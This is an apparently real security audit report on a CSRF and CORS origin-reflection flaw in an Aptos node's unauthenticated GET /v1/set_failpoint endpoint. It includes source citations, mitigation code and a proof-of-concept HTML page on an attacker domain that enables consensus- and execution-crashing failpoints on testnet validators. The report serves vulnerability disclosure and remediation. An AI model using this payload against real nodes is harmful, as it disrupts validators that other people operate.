# Audit Report

## Title
CSRF Vulnerability in /set_failpoint Endpoint Allows Remote Validator Disruption via Cross-Origin Attacks

## Summary
The `/v1/set_failpoint` API endpoint is vulnerable to Cross-Site Request Forgery (CSRF) attacks due to misconfigured CORS headers that reflect any origin with credentials enabled, combined with lack of authentication and use of GET method. An attacker can host a malicious webpage that tricks validator node operators into enabling dangerous failpoints that crash critical consensus and execution paths, causing validator unavailability and network disruption.

## Finding Description

The vulnerability exists in the failpoint configuration endpoint implementation and CORS middleware setup.

**Vulnerable Endpoint Registration:** [1](#0-0) 

The endpoint is registered as a GET handler without any authentication middleware, accepting query parameters to configure failpoints.

**Vulnerable CORS Configuration:** [2](#0-1) 

The CORS middleware uses `Cors::new()` with `allow_credentials(true)` but does NOT explicitly set `allow_origin()`. This configuration causes the middleware to reflect the request's Origin header back in the response, effectively allowing any origin to make credentialed cross-origin requests.

**CORS Behavior Confirmation:** [3](#0-2) 

Tests confirm that when a request includes `origin: test`, the server reflects `access-control-allow-origin: test`, demonstrating origin reflection behavior.

**Endpoint Implementation:** [4](#0-3) 

The endpoint only checks if failpoints are enabled via configuration, with no authentication, CSRF token validation, or Referer header checking.

**Attack Scenario:**

1. Attacker hosts malicious webpage at `evil.com` containing:
```html
<script>
fetch('http://validator-api:8080/v1/set_failpoint?name=consensus::process::any&actions=return', {
  credentials: 'include'
});
</script>
```

2. Validator node operator visits `evil.com` while their browser has active sessions/cookies for their validator's API

3. Browser sends GET request to `/v1/set_failpoint` with cookies due to `credentials: include`

4. CORS middleware reflects `access-control-allow-origin: evil.com` with `access-control-allow-credentials: true`

5. Browser allows the cross-origin request to complete

6. The endpoint enables the dangerous failpoint without authentication

**Dangerous Failpoints Available:** [5](#0-4) 

This failpoint causes all consensus message processing to error, stalling the consensus protocol. [6](#0-5) 

This failpoint causes block execution to fail, preventing new blocks from being committed. [7](#0-6) 

This failpoint causes proposal message processing to error, making the validator appear Byzantine.

## Impact Explanation

This vulnerability qualifies as **HIGH severity** under the Aptos bug bounty program criteria:

1. **Validator node slowdowns**: Enabled failpoints directly cause consensus timeouts, message processing failures, and validator stalls
2. **API crashes**: Certain failpoints can crash critical execution paths
3. **Significant protocol violations**: Affected validators stop participating in consensus, reducing network Byzantine fault tolerance

The impact is amplified because:
- Multiple validators can be targeted simultaneously
- Failpoints persist until manually disabled or node restart
- Network-wide consensus delays if >1/3 validators are affected
- Operators may not immediately recognize the attack source

**Affected Systems:**
- Testnet/devnet validators with `failpoints_enabled: true` in configuration [8](#0-7) 
- Local development nodes used by core developers
- Any non-mainnet validator exposing the API publicly

**Mitigation via Configuration:** [9](#0-8) 

Mainnet nodes are protected by config sanitizer that prevents failpoints from being enabled. However, testnet/devnet validators remain vulnerable.

## Likelihood Explanation

**Likelihood: MEDIUM to HIGH**

**Factors increasing likelihood:**
1. **Low attacker complexity**: Simple HTML/JavaScript hosted anywhere
2. **No authentication required**: Endpoint accessible without credentials
3. **GET method**: Trivial to trigger via img tags, script tags, or fetch
4. **Common target**: Validators often monitored via web dashboards, increasing browser exposure
5. **Config enabled on test networks**: Testnet/devnet validators legitimately enable failpoints for testing

**Factors decreasing likelihood:**
1. **Limited scope**: Only affects non-mainnet nodes with `failpoints_enabled: true`
2. **Requires operator interaction**: Operator must visit malicious site
3. **Observable impact**: Validator disruption is immediately noticeable

**Real-world scenario:** Attacker embeds malicious JavaScript in:
- Blockchain explorer advertisements
- Validator monitoring dashboard third-party widgets
- Community forum signatures/posts
- Social media links targeting validator operators

## Recommendation

Implement multiple defense layers:

**1. Add authentication to the failpoint endpoint:**
```rust
// In api/src/runtime.rs, add authentication middleware
use poem::middleware::AddData;

let failpoint_auth_token = std::env::var("FAILPOINT_AUTH_TOKEN")
    .unwrap_or_else(|_| "".to_string());

.at(
    "/set_failpoint",
    poem::get(set_failpoints::set_failpoint_poem)
        .data(context.clone())
        .data(failpoint_auth_token)
        .around(failpoint_auth_middleware),
)
```

**2. Change to POST method and require CSRF token:**
```rust
// In api/src/set_failpoints.rs
#[handler]
pub fn set_failpoint_poem(
    context: Data<&std::sync::Arc<Context>>,
    Json(failpoint_conf): Json<FailpointConf>,  // Changed from Query
    csrf_token: Header<String>,  // Add CSRF token validation
) -> poem::Result<String> {
    // Validate CSRF token
    // Then existing logic
}
```

**3. Fix CORS configuration to explicitly whitelist origins:**
```rust
// In api/src/runtime.rs
let cors = Cors::new()
    .allow_origin("http://localhost:3000")  // Explicit whitelist
    .allow_credentials(true)
    .allow_methods(vec![Method::GET, Method::POST]);
```

**4. Add Referer header validation as additional defense:**
```rust
// Check that Referer header matches expected origin
if let Some(referer) = request.header("referer") {
    // Validate referer is from trusted origin
}
```

**5. Bind API to localhost by default:**
Update default configuration to bind to 127.0.0.1 instead of 0.0.0.0 for failpoint-enabled nodes.

## Proof of Concept

**Attacker's malicious webpage (evil.html):**
```html
<!DOCTYPE html>
<html>
<head>
    <title>Innocent Page</title>
</head>
<body>
    <h1>Blockchain News</h1>
    <script>
        // Target validator's API endpoint
        const targetAPI = 'http://validator.testnet.example.com:8080';
        
        // Enable failpoint to crash consensus message processing
        fetch(`${targetAPI}/v1/set_failpoint?name=consensus::process::any&actions=return`, {
            method: 'GET',
            credentials: 'include',
            mode: 'cors'
        }).then(resp => {
            console.log('Failpoint enabled - validator will stop processing consensus');
        }).catch(err => {
            console.log('Attack failed:', err);
        });
        
        // Enable failpoint to crash block execution
        fetch(`${targetAPI}/v1/set_failpoint?name=executor::block_executor_execute_block&actions=return`, {
            method: 'GET',
            credentials: 'include',
            mode: 'cors'
        });
    </script>
</body>
</html>
```

**Test scenario:** [10](#0-9) 

This test demonstrates that failpoints successfully disrupt validator operation when enabled via the API endpoint.

**Reproduction steps:**
1. Start testnet validator with `failpoints_enabled: true` in config
2. Ensure API is accessible on network (not localhost-only)
3. Host evil.html on attacker-controlled domain
4. Victim validator operator visits the page with browser
5. JavaScript executes, enabling failpoints via CSRF
6. Validator stops processing consensus messages and blocks
7. Network observes validator timeout and reduced participation

## Notes

The vulnerability combines three security weaknesses:
1. **CORS misconfiguration** - Origin reflection with credentials
2. **Missing authentication** - No access control on sensitive endpoint  
3. **CSRF-friendly design** - GET method with query parameters

While mainnet protection exists via configuration sanitization, the attack surface on testnet/devnet is significant, as these networks are critical for protocol development and testing. A successful attack could disrupt development workflows, testing infrastructure, and community confidence in network stability.

### Citations

**File:** api/src/runtime.rs (L230-235)
```rust
        let cors = Cors::new()
            // To allow browsers to use cookies (for cookie-based sticky
            // routing in the LB) we must enable this:
            // https://stackoverflow.com/a/24689738/3846032
            .allow_credentials(true)
            .allow_methods(vec![Method::GET, Method::POST]);
```

**File:** api/src/runtime.rs (L248-251)
```rust
                    .at(
                        "/set_failpoint",
                        poem::get(set_failpoints::set_failpoint_poem).data(context.clone()),
                    ),
```

**File:** api/src/tests/index_test.rs (L59-74)
```rust
async fn test_cors() {
    let context = new_test_context(current_function_name!());
    let paths = ["/spec.yaml", "/spec", "/", "/transactions"];
    for path in paths {
        let req = warp::test::request()
            .header("origin", "test")
            .header("Access-Control-Request-Headers", "Content-Type")
            .header("Access-Control-Request-Method", "POST")
            .method("OPTIONS")
            .path(&format!("/v1{}", path));
        let resp = context.reply(req).await;
        assert_eq!(resp.status(), 200);
        let cors_header = resp.headers().get("access-control-allow-origin").unwrap();
        assert_eq!(cors_header, "test");
    }
}
```

**File:** api/src/set_failpoints.rs (L22-40)
```rust
#[handler]
pub fn set_failpoint_poem(
    context: Data<&std::sync::Arc<Context>>,
    Query(failpoint_conf): Query<FailpointConf>,
) -> poem::Result<String> {
    if context.failpoints_enabled() {
        fail::cfg(&failpoint_conf.name, &failpoint_conf.actions)
            .map_err(|e| poem::Error::from(anyhow::anyhow!(e)))?;
        info!(
            "Configured failpoint {} to {}",
            failpoint_conf.name, failpoint_conf.actions
        );
        Ok(format!("Set failpoint {}", failpoint_conf.name))
    } else {
        Err(poem::Error::from(anyhow::anyhow!(
            "Failpoints are not enabled at a config level"
        )))
    }
}
```

**File:** consensus/src/epoch_manager.rs (L1533-1535)
```rust
        fail_point!("consensus::process::any", |_| {
            Err(anyhow::anyhow!("Injected error in process_message"))
        });
```

**File:** execution/executor/src/block_executor/mod.rs (L236-239)
```rust
                fail_point!("executor::block_executor_execute_block", |_| {
                    Err(ExecutorError::from(anyhow::anyhow!(
                        "Injected error in block_executor_execute_block"
                    )))
```

**File:** consensus/src/round_manager.rs (L727-729)
```rust
        fail_point!("consensus::process_proposal_msg", |_| {
            Err(anyhow::anyhow!("Injected error in process_proposal_msg"))
        });
```

**File:** config/src/config/api_config.rs (L32-34)
```rust
    /// Enables failpoints for error testing
    #[serde(default = "default_disabled")]
    pub failpoints_enabled: bool,
```

**File:** config/src/config/api_config.rs (L177-184)
```rust
        // Verify that failpoints are not enabled in mainnet
        if let Some(chain_id) = chain_id {
            if chain_id.is_mainnet() && api_config.failpoints_enabled {
                return Err(Error::ConfigSanitizerFailed(
                    sanitizer_name,
                    "Failpoints are not supported on mainnet nodes!".into(),
                ));
            }
```

**File:** testsuite/smoke-test/src/execution.rs (L19-43)
```rust
#[tokio::test]
async fn fallback_test() {
    let swarm = SwarmBuilder::new_local(1)
        .with_init_config(Arc::new(|_, config, _| {
            config.api.failpoints_enabled = true;
            config.execution.discard_failed_blocks = true;
        }))
        .with_aptos()
        .build()
        .await;

    swarm
        .wait_for_all_nodes_to_catchup_to_epoch(2, Duration::from_secs(60))
        .await
        .expect("Epoch 2 taking too long to come!");

    let client = swarm.validators().next().unwrap().rest_client();

    client
        .set_failpoint(
            "aptos_vm::vm_wrapper::execute_transaction".to_string(),
            "100%return".to_string(),
        )
        .await
        .unwrap();
```
